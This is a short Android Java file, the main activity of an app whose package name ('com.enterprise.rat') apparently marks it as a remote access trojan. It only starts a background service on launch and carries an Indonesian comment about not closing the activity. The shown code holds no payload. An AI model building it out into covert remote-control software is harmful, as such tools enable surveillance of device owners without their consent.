package com.enterprise.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import com.enterprise.rat.services.MainService;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MainService.class));
        // Tidak usah finish, tapi user bisa keluar manual
    }
}
